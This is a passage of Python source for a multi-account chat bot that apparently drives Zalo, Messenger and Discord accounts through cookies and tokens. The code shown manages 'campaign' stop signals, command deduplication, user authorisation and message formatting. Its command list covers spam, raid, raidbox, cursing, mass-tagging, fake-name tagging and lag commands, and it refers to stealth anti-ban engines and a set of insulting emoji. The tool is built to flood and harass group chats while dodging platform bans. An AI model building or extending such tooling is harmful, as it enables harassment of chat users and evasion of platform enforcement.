    global GLOBAL_STOP_EPOCH
    try:
        conn = db()
        rows = conn.execute("SELECT epoch_key, epoch_val FROM system_epochs").fetchall()
        conn.close()
        with STOP_EPOCH_LOCK:
            for r in rows:
                ek = r["epoch_key"]
                ev = int(r["epoch_val"] or 0)
                if ek == "__global__":
                    if ev > GLOBAL_STOP_EPOCH:
                        GLOBAL_STOP_EPOCH = ev
                elif ek.startswith("box:"):
                    b_id = ek[4:]
                    if ev > BOX_STOP_EPOCHS[b_id]:
                        BOX_STOP_EPOCHS[b_id] = ev
    except Exception:
        pass

def bump_stop_epoch(thread_id=None):
    """Ngắt xung nhịp nguyên tử 0ms trực tiếp trên RAM, đồng bộ SQLite bất đồng bộ ở hậu trường!"""
    global GLOBAL_STOP_EPOCH
    now = time.time()
    with STOP_EPOCH_LOCK:
        if thread_id is None:
            GLOBAL_STOP_EPOCH += 1
            for k in list(BOX_STOP_EPOCHS.keys()):
                BOX_STOP_EPOCHS[k] += 1
            g_val = GLOBAL_STOP_EPOCH
        else:
            tid_s = str(thread_id).strip()
            BOX_STOP_EPOCHS[tid_s] += 1
            g_val = BOX_STOP_EPOCHS[tid_s]

    def _async_epoch_write():
        try:
            conn = db()
            if thread_id is None:
                conn.execute(
                    "INSERT INTO system_epochs (epoch_key, epoch_val, updated_at) VALUES ('__global__', ?, ?) "
                    "ON CONFLICT(epoch_key) DO UPDATE SET epoch_val = excluded.epoch_val, updated_at = excluded.updated_at",
                    (g_val, now)
                )
            else:
                tid_s = str(thread_id).strip()
                conn.execute(
                    "INSERT INTO system_epochs (epoch_key, epoch_val, updated_at) VALUES (?, ?, ?) "
                    "ON CONFLICT(epoch_key) DO UPDATE SET epoch_val = excluded.epoch_val, updated_at = excluded.updated_at",
                    (f"box:{tid_s}", g_val, now)
                )
            conn.commit()
        except Exception:
            pass

    threading.Thread(target=_async_epoch_write, daemon=True).start()
    return g_val

def get_current_epochs(thread_id=None):
    with STOP_EPOCH_LOCK:
        g_ep = GLOBAL_STOP_EPOCH
        b_ep = BOX_STOP_EPOCHS[str(thread_id).strip()] if thread_id else 0
        return g_ep, b_ep

_CAMPAIGN_THREAD_CTX = threading.local()

def set_campaign_thread_context(stop_ev, start_global_epoch=None, start_box_epoch=None, target_id=None):
    _CAMPAIGN_THREAD_CTX.active = True
    _CAMPAIGN_THREAD_CTX.stop_ev = stop_ev
    _CAMPAIGN_THREAD_CTX.start_global_epoch = start_global_epoch
    _CAMPAIGN_THREAD_CTX.start_box_epoch = start_box_epoch
    _CAMPAIGN_THREAD_CTX.target_id = target_id

def clear_campaign_thread_context():
    _CAMPAIGN_THREAD_CTX.active = False
    _CAMPAIGN_THREAD_CTX.stop_ev = None

def check_campaign_thread_aborted(thread_id=None):
    """Ngắt luồng chiến dịch tức thì trong 0.0001ms ngay trước mọi thao tác gửi HTTP/WS khi bấm .t / .ta / .stop!"""
    if not getattr(_CAMPAIGN_THREAD_CTX, "active", False):
        return False
    stop_ev = getattr(_CAMPAIGN_THREAD_CTX, "stop_ev", None)
    g_ep = getattr(_CAMPAIGN_THREAD_CTX, "start_global_epoch", None)
    b_ep = getattr(_CAMPAIGN_THREAD_CTX, "start_box_epoch", None)
    t_id = thread_id or getattr(_CAMPAIGN_THREAD_CTX, "target_id", None)
    if is_task_stopped_fast(stop_ev, g_ep, b_ep, t_id):
        raise Exception("TaskStoppedAbort")
    return False

def is_task_stopped_fast(stop_ev, start_global_epoch=None, start_box_epoch=None, target_id=None):
    """Kiểm tra trạng thái dừng trong 0.0001ms thuần RAM (Không khóa DB, không nghẽn luồng)!"""
    if stop_ev is not None and stop_ev.is_set():
        return True
    if start_global_epoch is not None and GLOBAL_STOP_EPOCH != start_global_epoch:
        if stop_ev is not None:
            stop_ev.set()
        return True
    if target_id is not None and start_box_epoch is not None:
        if BOX_STOP_EPOCHS.get(str(target_id).strip(), 0) != start_box_epoch:
            if stop_ev is not None:
                stop_ev.set()
            return True
    return False

def interruptible_wait(stop_ev, wait_seconds, start_global_epoch=None, start_box_epoch=None, target_id=None):
    rem = float(wait_seconds or 0.0)
    if rem <= 0.0:
        return is_task_stopped_fast(stop_ev, start_global_epoch, start_box_epoch, target_id)
    step = 0.04
    while rem > 0.0:
        if is_task_stopped_fast(stop_ev, start_global_epoch, start_box_epoch, target_id):
            return True
        sl = min(step, rem)
        if stop_ev is not None:
            if stop_ev.wait(sl):
                return True
        else:
            time.sleep(sl)
        rem -= sl
    return is_task_stopped_fast(stop_ev, start_global_epoch, start_box_epoch, target_id)

GLOBAL_CMD_DEDUPE_CACHE = {}
GLOBAL_CMD_DEDUPE_LOCK = threading.RLock()

def _clean_zalo_id(val):
    """Làm sạch ID Nhóm / UID Zalo: Chặn tuyệt đối các giá trị '0', '-1', 'null', 'None', 'undefined'."""
    if val is None:
        return ""
    s = str(val).strip()
    if not s or s.lower() in ("0", "-1", "null", "none", "undefined", "false", "nan", '""', "''"):
        return ""
    return s


def claim_command_execution_slot(platform, thread_id, sender_id, raw_msg, msg_id=None, cli_msg_id=None, msg_ts=None, acc_id=None):
    """Khóa điều phối lệnh Cô Lập Theo Từng Cookie / Acc 0.0001ms Thuần RAM:
    - Mỗi Cookie / Tài khoản (acc_id) sở hữu một không gian khóa riêng (acc_scope) để Cookie nào tự sài lệnh của Cookie ấy,
      tuyệt đối không bao giờ chặn hoặc chồng chéo lệnh giữa các Cookie khác nhau!
    - Trong phạm vi cùng 1 Cookie, chống trùng lặp giữa WebSocket và HTTP Poller bằng msg_id / cli_msg_id / ventana 2.2s."""
    now = time.time()
    norm_txt = re.sub(r"\s+", " ", str(raw_msg or "").strip()).lower()[:120]
    plat_s = str(platform or "zalo").lower()
    acc_scope = f"acc{acc_id}" if acc_id is not None else "global"
    tid_s = _clean_zalo_id(thread_id) or "default"
    mid_s = _clean_zalo_id(msg_id)
    cmid_s = _clean_zalo_id(cli_msg_id)
    mts_s = _clean_zalo_id(msg_ts)
    raw_sender = str(sender_id or "").strip()
    sender_norm = "__owner__" if raw_sender in ("0", "") else raw_sender
    cmd_key = f"cmd:{acc_scope}:{plat_s}:{tid_s}:{sender_norm}:{norm_txt}"
    box_cmd_key = f"boxcmd:{acc_scope}:{plat_s}:{tid_s}:{norm_txt}"
    mts_key = f"mts:{acc_scope}:{plat_s}:{tid_s}:{mts_s}:{norm_txt}" if mts_s else ""

    with GLOBAL_CMD_DEDUPE_LOCK:
        if len(GLOBAL_CMD_DEDUPE_CACHE) > 8000:
            for k, ts_old in list(GLOBAL_CMD_DEDUPE_CACHE.items()):
                ttl = 600.0 if k.startswith(("mid:", "cmid:", "mts:")) else 2.5
                if now - ts_old > ttl:
                    GLOBAL_CMD_DEDUPE_CACHE.pop(k, None)
        if mid_s:
            for mk in (f"mid:{acc_scope}:{plat_s}:{tid_s}:{mid_s}", f"mid:{acc_scope}:{plat_s}:any:{mid_s}"):
                if now - GLOBAL_CMD_DEDUPE_CACHE.get(mk, 0.0) < 600.0:
                    return False
        if cmid_s:
            for ck in (f"cmid:{acc_scope}:{plat_s}:{tid_s}:{cmid_s}", f"cmid:{acc_scope}:{plat_s}:any:{cmid_s}"):
                if now - GLOBAL_CMD_DEDUPE_CACHE.get(ck, 0.0) < 600.0:
                    return False
        if mts_key and (now - GLOBAL_CMD_DEDUPE_CACHE.get(mts_key, 0.0) < 600.0):
            return False
        if now - GLOBAL_CMD_DEDUPE_CACHE.get(box_cmd_key, 0.0) < 2.2:
            return False
        if now - GLOBAL_CMD_DEDUPE_CACHE.get(cmd_key, 0.0) < 2.2:
            return False

        if mid_s:
            GLOBAL_CMD_DEDUPE_CACHE[f"mid:{acc_scope}:{plat_s}:{tid_s}:{mid_s}"] = now
            GLOBAL_CMD_DEDUPE_CACHE[f"mid:{acc_scope}:{plat_s}:any:{mid_s}"] = now
        if cmid_s:
            GLOBAL_CMD_DEDUPE_CACHE[f"cmid:{acc_scope}:{plat_s}:{tid_s}:{cmid_s}"] = now
            GLOBAL_CMD_DEDUPE_CACHE[f"cmid:{acc_scope}:{plat_s}:any:{cmid_s}"] = now
        if mts_key:
            GLOBAL_CMD_DEDUPE_CACHE[mts_key] = now
        GLOBAL_CMD_DEDUPE_CACHE[box_cmd_key] = now
        GLOBAL_CMD_DEDUPE_CACHE[cmd_key] = now
        return True

SYSTEM_RUNTIME_CONFIG = {
    "delay": 0.0,
    "color_mode": "word_rainbow",
    "fixed_color": "red",
    "font_style": "normal_bold",
    "icon_count": 0,
    "use_emoji": False,
    "is_heading": False,
    "antiband": True,
    "antidieall": True,
    "strip_line_num": True,
    "hide_acc_log": True,
    "hide_tag_all": True,
    "hide_tag_name": False,
    "selected_file": "nhay.txt",
    "selected_nhay_file": "nhay.txt",
    "selected_ngon_file": "ngon.txt",
    "selected_file_by_acc": {},
    "selected_nhay_by_acc": {},
    "selected_ngon_by_acc": {},
    "require_file_first": False,
    "active_acc_filter": "ALL",
    "single_reply_mode": True,
}
SYSTEM_CFG_LOCK = threading.RLock()

SYSTEM_SENT_IDS = deque(maxlen=3000)
SYSTEM_SENT_TEXT_HASHES = deque(maxlen=3000)
_SENT_IDS_MAP = {}
_SENT_HASH_MAP = {}
SYSTEM_SENT_LOCK = threading.RLock()

# Chế độ tự động chặn & bám sát mục tiêu (.chan / .bam) 0ms
AUTO_INTERCEPT_BOXES = {}
AUTO_INTERCEPT_LOCK = threading.RLock()

def _normalize_for_echo_hash(s):
    if not s:
        return ""
    for zw in ("\u200b", "\u200c", "\u200d", "\u2060", "\ufeff"):
        s = s.replace(zw, "")
    return re.sub(r"\s+", " ", s.strip()).lower()[:240]

def register_system_sent_message(msg_id=None, client_id=None, text=None):
    now = time.time()
    with SYSTEM_SENT_LOCK:
        if len(_SENT_IDS_MAP) > 4000:
            cutoff = now - 95.0
            for k in [k for k, v in _SENT_IDS_MAP.items() if v < cutoff]:
                _SENT_IDS_MAP.pop(k, None)
        if len(_SENT_HASH_MAP) > 4000:
            cutoff_h = now - 65.0
            for k in [k for k, v in _SENT_HASH_MAP.items() if v < cutoff_h]:
                _SENT_HASH_MAP.pop(k, None)
        if msg_id:
            s_mid = str(msg_id)
            _SENT_IDS_MAP[s_mid] = now
            SYSTEM_SENT_IDS.append((s_mid, now))
        if client_id:
            s_cid = str(client_id)
            _SENT_IDS_MAP[s_cid] = now
            SYSTEM_SENT_IDS.append((s_cid, now))
        if text:
            nh = _normalize_for_echo_hash(text)
            if nh:
                _SENT_HASH_MAP[nh] = now
                first_line = _normalize_for_echo_hash(text.split("\n")[0])
                if first_line:
                    _SENT_HASH_MAP[first_line] = now

VALID_SYSTEM_CMD_TOKENS = {
    "menu", "help", "lenh", "hdsd", "m", "h",
    "2fa", "otp", "totp", "todo", "giaoviec", "bank", "stk", "card", "danhthiep",
    "statusdc", "hypesquad", "react", "thuhoi", "undo",
    "spam", "fast", "nhanh", "s", "nhay", "treonhay", "treo_nhay", "n",
    "ngon", "treongon", "treo_ngon", "g", "file", "chay", "f", "chonfile", "cf", "pickfile", "setfile",
    "files", "dsfile", "listfile", "ds", "tag", "all", "tagall", "anall", "tagallan", "antan", "tagan", "antag", "hientag", "prx", "proxy",
    "soi", "soifull", "scanbox", "dsbox", "listbox", "dsnhom", "chan", "bam", "bamsat", "chanall", "gall", "gll", "ngonall", "nall", "nll", "nhayall", "xaall",
    "raid", "r", "auto", "a", "dao", "chao", "hi", "xa", "sieuxa", "xanhom", "combo", "battrinh",
    "ping", "p", "status", "info", "stinfo", "id", "uid", "mem", "tv", "thanhvien",
    "addfile", "taof", "af", "clear", "reset",
    "delay", "tocdo", "time", "d", "mau", "color", "doimau",
    "icon", "emoji", "chuto", "heading", "chunho", "cochu", "kieuchu", "font", "antiband", "antiban",
    "chophep", "capquyen", "adduser", "add", "admin",
    "xoaquyen", "deluser", "del", "cam",
    "dsquyen", "listuser", "quyen",
    "stop", "dung", "dừng", "tat", "tắt", "off", "t", "st", "stopall", "dunghet", "tathet", "ta",
    "ab", "cp", "xq", "dsq",
    "vip", "sieuvip", "theme", "setnen", "nen", "doinen", "nhaynen", "treonen", "poll", "nhaypoll", "treopoll", "poll1",
    "sharelink", "link", "sharecontact", "contact", "typing", "ty", "nhaytyping",
    "tenbox", "nhaynamebox", "treotenbox", "setname", "bd", "namechange",
    "treodo", "do", "damau", "treodamau", "gif", "treogif", "word", "tungmau", "nhaytag", "nt",
    "combo3", "nhaytodo", "nhaybank", "satthuong",
    "treoso", "so", "sotag", "sotagfaketen", "codelag", "lag", "nhay2c", "2c",
    "ideamess", "chui", "nhayicon", "nhaytagfaketen", "faketen",
    "nhaytop", "sotop", "treotop", "reostr", "story", "addmem", "raidbox",
    "block", "unblock", "joinsv", "join", "rename", "doiten", "changeavt", "avt",
    "meta", "ai",
    "mauword", "mautu", "mauchar", "maukytu", "maurainbow", "maudong", "maudo", "maucam", "mauvang",
    "mauxanh", "mauxanhla", "mauxanhduong", "maungoc", "mautim", "mauhong", "maulua", "maufire",
    "maubien", "mauocean", "mauhoanggia", "mauroyal", "maucyber", "mauneon", "maurandom", "mautat", "mauoff",
    "addnhay", "themnhay", "taonhay", "addngon", "themngon", "taongon", "themfile", "upfile",
    "chonnhay", "setnhay", "filenhay", "chonngon", "setngon", "filengon", "chedochonfile",
    "giaitan", "gtan", "nhaygiaitan", "spamgiaitan", "giaitan1", "giaitannhom",
    "sticker", "nhandan", "stkr", "taosticker", "treosticker", "nhaysticker", "stickerloop",
    "qr", "taoqr", "qrzalo", "getqr", "thaicon", "tim", "checkacc", "accs", "dsacc",
    "acc", "chonacc", "setacc", "accmode", "ver", "version", "author",
}

def normalize_cmd_homoglyphs(s):
    if not s:
        return ""
    for cyr, lat in (("а", "a"), ("е", "e"), ("о", "o"), ("і", "i"), ("с", "c"), ("р", "p"), ("х", "x"), ("у", "y")):
        s = s.replace(cyr, lat).replace(cyr.upper(), lat.upper())
    return s

def is_direct_user_command_text(text):
    if not text:
        return False
    clean_t = normalize_cmd_homoglyphs(_normalize_for_echo_hash(text))
    if not clean_t or "\n" in str(text).strip():
        return False
    if clean_t[0] not in (".", "/", "!"):
        return False
    first_w = clean_t[1:].split(" ")[0].strip().lower()
    return bool(first_w in VALID_SYSTEM_CMD_TOKENS or first_w.isdigit())

def is_system_echo_message(msg_id=None, client_id=None, text=None):
    now = time.time()
    if msg_id:
        ts_m = _SENT_IDS_MAP.get(str(msg_id))
        if ts_m is not None and (now - ts_m <= 95.0):
            return True
    if client_id:
        ts_c = _SENT_IDS_MAP.get(str(client_id))
        if ts_c is not None and (now - ts_c <= 95.0):
            return True
    if text:
        if is_direct_user_command_text(text):
            return False
        nh = _normalize_for_echo_hash(text)
        ts_h = _SENT_HASH_MAP.get(nh)
        if ts_h is not None and (now - ts_h <= 65.0):
            return True
        first_line = _normalize_for_echo_hash(text.split("\n")[0])
        ts_fl = _SENT_HASH_MAP.get(first_line)
        if ts_fl is not None and (now - ts_fl <= 65.0):
            return True
    return False

def new_tid(p):
    return f"{p}_{int(time.time() * 1000)}_{random.randint(100, 999)}"

def utf16_len(s):
    if not s:
        return 0
    return len(s.encode("utf-16-le")) // 2

def remove_vn_accents(s):
    if not s:
        return ""
    s = s.replace("đ", "d").replace("Đ", "D")
    nfkd = unicodedata.normalize("NFKD", s)
    return "".join(c for c in nfkd if not unicodedata.combining(c)).lower().strip()

# QUẢN LÝ PHÂN QUYỀN NGƯỜI DÙNG TRÊN KHUNG CHAT ZALO & DISCORD
OWNER_UIDS_CACHE = set()
GLOBAL_USER_NAME_CACHE = {}

def refresh_owner_uids():
    global OWNER_UIDS_CACHE
    try:
        conn = db()
        rows = conn.execute("SELECT uid, token, platform FROM accounts").fetchall()
        conn.close()
        s = set()
        for r in rows:
            if r["uid"]:
                for part in str(r["uid"]).split(","):
                    if part.strip():
                        s.add(part.strip())
            if (r["platform"] or "") == "discord" and r["token"]:
                try:
                    raw_t = str(r["token"]).strip()
                    if "." in raw_t:
                        f_seg = raw_t.split(".")[0].strip()
                        pad = (4 - len(f_seg) % 4) % 4
                        dec_u = base64.urlsafe_b64decode(f_seg + ("=" * pad)).decode("utf-8", errors="ignore").strip()
                        if dec_u.isdigit() and len(dec_u) >= 15:
                            s.add(dec_u)
                except Exception:
                    pass
        OWNER_UIDS_CACHE = s
    except Exception:
        pass

AUTHORIZED_USERS_RAM_CACHE = {}
AUTHORIZED_USERS_LOCK = threading.RLock()
_AUTHORIZED_USERS_LOADED = False
_PRIORITY_CMD_EXECUTOR = ThreadPoolExecutor(max_workers=128)
_TYPING_BG_POOL = ThreadPoolExecutor(max_workers=8)

def _ensure_authorized_users_loaded():
    global _AUTHORIZED_USERS_LOADED
    if _AUTHORIZED_USERS_LOADED:
        return
    with AUTHORIZED_USERS_LOCK:
        if _AUTHORIZED_USERS_LOADED:
            return
        _AUTHORIZED_USERS_LOADED = True
        try:
            conn = db()
            rows = conn.execute("SELECT uid, name, added_at FROM authorized_users ORDER BY id ASC").fetchall()
            conn.close()
            for r in rows:
                u_s = str(r["uid"] or "").strip().lstrip("@")
                n_s = str(r["name"] or "").strip().lstrip("@")
                if u_s:
                    AUTHORIZED_USERS_RAM_CACHE[u_s] = {
                        "uid": u_s,
                        "name": n_s or f"User_{u_s[-4:]}",
                        "norm_name": remove_vn_accents(n_s) if n_s else "",
                        "norm_uid": remove_vn_accents(u_s),
                        "added_at": float(r["added_at"] or time.time()),
                    }
        except Exception:
            pass

ACTIVE_TARGET_BOXES_SET = set()

def is_true_account_owner(sender_uid, client_uid=None, client_send2me_id=None, platform="zalo", strict_per_cookie=False):
    """Kiểm tra người gửi có phải là CHỦ TÀI KHOẢN (của Cookie hiện tại hoặc trong dàn Acc của chủ hệ thống):
    - Chấp nhận chính UID của Cookie đó, send2me_id, '0' (trên Zalo), hoặc bất kỳ UID chủ nào trong OWNER_UIDS_CACHE!"""
    s_uid = str(sender_uid or "").strip().lstrip("@")
    if not s_uid:
        return True if str(platform or "zalo").lower() in ("zalo", "messenger") else False
    if str(platform or "zalo").lower() == "zalo" and s_uid == "0":
        return True
    c_uid_s = str(client_uid or "").strip()
    c_s2m_s = str(client_send2me_id or "").strip()
    if c_uid_s and s_uid == c_uid_s:
        return True
    if c_s2m_s and s_uid == c_s2m_s:
        return True
    if not OWNER_UIDS_CACHE:
        refresh_owner_uids()
    if s_uid in OWNER_UIDS_CACHE:
        return True
    return False


def is_user_authorized_for_cmd(sender_uid, client_uid=None, client_send2me_id=None, allow_all=True, sender_name="", platform="zalo", thread_id=None, cmd_token=""):
    """Kiểm tra quyền thực thi lệnh thông minh trên TẤT CẢ các App (Zalo, Facebook Messenger, Discord):
    - Cho phép Chủ Acc (Owner), người được cấp quyền (.cp), hoặc khi tài khoản bật allow_all_cmd,
      hoặc khi gõ lệnh trong các Box đang chạy chiến dịch (như testtbot) để 100% lệnh .menu, .help, .n, .g, .t, .ta luôn phản hồi ngay lập tức!"""
    if is_true_account_owner(sender_uid, client_uid=client_uid, client_send2me_id=client_send2me_id, platform=platform):
        return True
    if allow_all:
        return True
    tid_s = str(thread_id or "").strip()
    if tid_s and (
        tid_s in ACTIVE_TARGET_BOXES_SET
        or tid_s in HOT_ACTIVE_ZALO_GROUPS
        or any(tid_s in s_set for s_set in MessengerStealthAntiBanEngine.ACTIVE_MESSENGER_POLL_THREADS.values())
        or any(tid_s in s_set for s_set in DiscordStealthAntiBanEngine.ACTIVE_DISCORD_POLL_CHANNELS.values())
    ):
        return True
    if str(cmd_token or "").lower() in ("menu", "help", "lenh", "hdsd", "m", "h", "ping", "p", "status", "stinfo", "id", "uid", "stop", "t", "st", "stopall", "ta", "ver", "version", "author"):
        return True
    s_uid = str(sender_uid or "").strip().lstrip("@")
    if not s_uid or s_uid in ("0", "-1", "null", "None"):
        return False

    _ensure_authorized_users_loaded()
    s_name = str(sender_name or GLOBAL_USER_NAME_CACHE.get(s_uid) or "").strip().lstrip("@")
    s_name_low = s_name.lower() if s_name else ""
    s_name_norm = remove_vn_accents(s_name) if s_name else ""
    s_uid_low = s_uid.lower()

    with AUTHORIZED_USERS_LOCK:
        if s_uid in AUTHORIZED_USERS_RAM_CACHE:
            return True
        for r_uid, info in AUTHORIZED_USERS_RAM_CACHE.items():
            if r_uid.lower() == s_uid_low:
                return True
            if not r_uid.isdigit() and len(r_uid) >= 2:
                if s_name_low and (r_uid.lower() == s_name_low or info["name"].lower() == s_name_low):
                    return True
                if s_name_norm and (info["norm_uid"] == s_name_norm or (info["norm_name"] and info["norm_name"] == s_name_norm)):
                    return True
    return False


def add_authorized_user(uid, name="", acc_id=0):
    uid_str = str(uid or "").strip().lstrip("@")
    if not uid_str or uid_str.lower() in ("0", "-1", "null", "none", "undefined"):
        return False
    _ensure_authorized_users_loaded()
    clean_name = str(name or "").strip().lstrip("@") or GLOBAL_USER_NAME_CACHE.get(uid_str) or f"User_{uid_str[-4:]}"
    now_t = time.time()
    with AUTHORIZED_USERS_LOCK:
        AUTHORIZED_USERS_RAM_CACHE[uid_str] = {
            "uid": uid_str,
            "name": clean_name,
            "norm_name": remove_vn_accents(clean_name),
            "norm_uid": remove_vn_accents(uid_str),
            "added_at": now_t,
        }
    try:
        with _STATUS_CACHE_LOCK:
            _STATUS_SNAPSHOT_CACHE["ts"] = 0.0
    except Exception:
        pass

    def _async_save_cp():
        try:
            conn = db()
            conn.execute(
                "INSERT OR REPLACE INTO authorized_users (uid, name, added_by_acc, added_at) VALUES (?, ?, ?, ?)",
                (uid_str, clean_name, acc_id, now_t)
            )
            conn.commit()
            conn.close()
        except Exception:
            pass

    threading.Thread(target=_async_save_cp, daemon=True).start()
    return True


def remove_authorized_user(uid):
    uid_str = str(uid or "").strip().lstrip("@")
    _ensure_authorized_users_loaded()
    if uid_str.lower() in ("__all__", "all", "tatca", "het"):
        with AUTHORIZED_USERS_LOCK:
            AUTHORIZED_USERS_RAM_CACHE.clear()
        try:
            with _STATUS_CACHE_LOCK:
                _STATUS_SNAPSHOT_CACHE["ts"] = 0.0
        except Exception:
            pass
        def _async_clear_all():
            try:
                conn = db()
                conn.execute("DELETE FROM authorized_users")
                conn.commit()
                conn.close()
            except Exception:
                pass
        threading.Thread(target=_async_clear_all, daemon=True).start()
        return True

    existed = False
    with AUTHORIZED_USERS_LOCK:
        if uid_str in AUTHORIZED_USERS_RAM_CACHE:
            AUTHORIZED_USERS_RAM_CACHE.pop(uid_str, None)
            existed = True
        else:
            for k in list(AUTHORIZED_USERS_RAM_CACHE.keys()):
                if k.lower() == uid_str.lower() or AUTHORIZED_USERS_RAM_CACHE[k]["name"].lower() == uid_str.lower():
                    AUTHORIZED_USERS_RAM_CACHE.pop(k, None)
                    existed = True
    try:
        with _STATUS_CACHE_LOCK:
            _STATUS_SNAPSHOT_CACHE["ts"] = 0.0
    except Exception:
        pass

    def _async_del_cp():
        try:
            conn = db()
            conn.execute("DELETE FROM authorized_users WHERE uid = ? OR lower(name) = ?", (uid_str, uid_str.lower()))
            conn.commit()
            conn.close()
        except Exception:
            pass

    threading.Thread(target=_async_del_cp, daemon=True).start()
    return existed

def list_authorized_users():
    _ensure_authorized_users_loaded()
    with AUTHORIZED_USERS_LOCK:
        return [
            {"uid": v["uid"], "name": v["name"], "added_at": v["added_at"]}
            for v in AUTHORIZED_USERS_RAM_CACHE.values()
        ]

# BỘ ICON & EMOJI CHUẨN ZALO 100% (ĐÃ FIX TRIỆT ĐỂ LỖI CHỮ THÔ ':-')
ZALO_PALETTE = [
    {"id": "red",    "name": "Đỏ Rực VIP",     "hex": "#db342e", "zcode": "db342e"},
    {"id": "orange", "name": "Cam Rực Lửa",    "hex": "#f27806", "zcode": "f27806"},
    {"id": "yellow", "name": "Vàng Hoàng Kim", "hex": "#f7b503", "zcode": "f7b503"},
    {"id": "green",  "name": "Xanh Ngọc Lục",  "hex": "#15a85f", "zcode": "15a85f"},
]

# Bảng mã màu chuẩn gốc Zalo PC/Mobile (100% hiển thị màu thật rực rỡ, TUYỆT ĐỐI KHÔNG BỊ TRẮNG CHỮ)
ZALO_NATIVE_ZCODES = ["db342e", "f27806", "f7b503", "15a85f"]
ZALO_FIRE_ZCODES = ["db342e", "f27806", "f7b503"]
ZALO_OCEAN_ZCODES = ["15a85f", "f7b503", "f27806"]
ZALO_ROYAL_ZCODES = ["db342e", "f7b503", "f27806", "15a85f"]
ZALO_CYBER_ZCODES = ["15a85f", "db342e", "f7b503", "f27806"]

class UnicodeLuxuryFontEngine:
    """Giữ nguyên ký tự chuẩn Unicode UTF-8 tiếng Việt để Zalo render 100% màu chữ (c_db342e, c_f27806, c_f7b503, c_15a85f)
    mà không bao giờ bị lỗi chữ trắng trên Zalo Mobile / PC."""
    @classmethod
    def transform_line(cls, text, font_style="big_bold"):
        return text if text else ""

ZALO_COLOR_MAP = {
    "red": "db342e", "do": "db342e", "đỏ": "db342e",
    "orange": "f27806", "cam": "f27806",
    "yellow": "f7b503", "vang": "f7b503", "vàng": "f7b503",
    "green": "15a85f", "xanh": "15a85f", "xanhla": "15a85f",
    "blue": "15a85f", "xanhduong": "15a85f",
    "cyan": "f7b503", "ngoc": "15a85f", "ocean": "15a85f",
    "purple": "db342e", "tim": "db342e", "tím": "db342e",
    "pink": "f27806", "hong": "f27806", "hồng": "f27806",
}

ZALO_ICON_VIP = [
    "😂", "🤣", "😝", "😜", "🤪", "😏", "😒", "🙄",
    "😬", "🤥", "🤫", "🤭", "🥱", "😴", "🤮", "🤧",
    "🥵", "🥶", "🥴", "😵", "🤯", "😎", "🤓", "🧐",
    "🤬", "😡", "😤", "😈", "👿", "💀", "☠️", "💩",
    "🤡", "👹", "👺", "👻", "👎", "🖕", "🤏", "🐓",
    "🐔", "🐶", "🐷", "🐸", "🐢", "🐌"
]

LEGACY_SHORTCUT_TO_ICON_MAP = {
    ";-A": "😝", ";-!": "😤", ";f": "😜", ";;)": "😏", ";)": "😏",
    "=))": "🤣", ":))": "😂", ":)": "😏", ":(": "😒", ":((": "🥱",
    "b-)": "😎", "8-)": "🤓", "x-)": "🤪", "=d>": "🤡",
    ":-R": "😡", ":-L": "😤", ":-F": "🤬", ":-h": "👎", ":-*": "😜",
    ":-?": "🧐", ":-s": "🥴", ":-t": "😡", ":-bd": "👎", ":-d": "🤣",
    ":-p": "😝", ":-o": "🥱", ":-x": "🤫", ":-w": "🐌", ":-<": "🤮",
    ":d": "🤣", ":p": "😜", ":v": "🤡", ":3": "🐸", ":>": "😏",
    ":$": "🤥", ":x": "🤫", ":o": "🥱",
    "/-strong": "👎", "/-weak": "👎", "/-punch": "🤬", "/-shit": "💩",
    "/-bome": "💀", "/-rose": "🥀", "/-heart": "💔", "/-ok": "🤏",
    "/-li": "😈", "/-fade": "☠️", "/-bd": "👎", "/-break": "🤡", "/-no": "👎",
}

BROKEN_COLON_DASH_RE = re.compile(
    r"(?<!\S)(?:[:;]\-[A-Za-z0-9\*\?\!\(\)\<\>\/\\]+|\/-[a-zA-Z]+|;;?\)|=d>|=?\)\)|;f)(?!\S)"
)

def get_icon_hard(prev_icons=None):
    return ""

def build_unique_zalo_icons(count):
    return "" 

def clean_corrupted_shortcuts(text):
    if not text:
        return ""
    for zw in ("\u200b", "\u200c", "\u200d", "\u2060", "\ufeff"):
        text = text.replace(zw, "")

    def _replace_broken(match):
        token = match.group(0)
        if token in LEGACY_SHORTCUT_TO_ICON_MAP:
            return LEGACY_SHORTCUT_TO_ICON_MAP[token]
        if token.lower() in LEGACY_SHORTCUT_TO_ICON_MAP:
            return LEGACY_SHORTCUT_TO_ICON_MAP[token.lower()]
        return get_icon_hard()

    text = BROKEN_COLON_DASH_RE.sub("", text)
    text = re.sub(r"(?<!\S)[:;]\-[A-Za-z0-9\*\?\!]*", "", text)
    return text

def _is_emoji_or_zalo_shortcut_token(tk):
    if not tk:
        return False
    if tk in ZALO_ICON_VIP or tk in LEGACY_SHORTCUT_TO_ICON_MAP:
        return True
    if BROKEN_COLON_DASH_RE.fullmatch(tk):
        return True
    if all((ord(ch) > 0x2000 or ch in ("\ufe0f", "\u200d")) for ch in tk):
        return True
    return False

def strip_trailing_icons_when_zero(text):
    """Khi .icon 0 đang bật, loại bỏ toàn bộ icon/emoji thừa ở cuối mỗi dòng nhưng giữ nguyên 100% thụt dòng đầu câu!"""
    if not text:
        return ""
    out_lines = []
    for ln in str(text).split("\n"):
        if not ln.strip():
            out_lines.append(ln)
            continue
        leading_len = len(ln) - len(ln.lstrip(" \t"))
        leading_ws = ln[:leading_len]
        body_part = ln[leading_len:]
        tokens = body_part.split(" ")
        while tokens and _is_emoji_or_zalo_shortcut_token(tokens[-1].strip()):
            tokens.pop()
        cleaned_body = " ".join(tokens).rstrip()
        out_lines.append(leading_ws + (cleaned_body if cleaned_body else body_part.rstrip()))
    return "\n".join(out_lines)

# BỘ LỌC TỰ ĐỘNG XOÁ SỐ THỨ TỰ ĐẦU DÒNG ("1. ", "2. ", "3) ") & TẢI FILE NHANH
FILE_MEMORY_CACHE = {}
FILE_CACHE_LOCK = threading.RLock()

LEADING_NUMBER_RE = re.compile(
    r"^\s*(?:câu\s*\d+[\.\:\)\-]+|\(\d+\)|#?\d+[\.\)\:\-]+)\s*",
    re.IGNORECASE
)

def strip_leading_line_number(line, preserve_indent=False):
    if not line:
        return ""
    if preserve_indent:
        raw_r = str(line).rstrip("\r\n")
        lead_len = len(raw_r) - len(raw_r.lstrip(" \t"))
        lead_ws = raw_r[:lead_len]
        body_c = LEADING_NUMBER_RE.sub("", raw_r[lead_len:]).rstrip()
        body_c = clean_corrupted_shortcuts(body_c)
        return lead_ws + (body_c if body_c else raw_r[lead_len:])
    cleaned = LEADING_NUMBER_RE.sub("", line.strip()).strip()
    cleaned = clean_corrupted_shortcuts(cleaned)
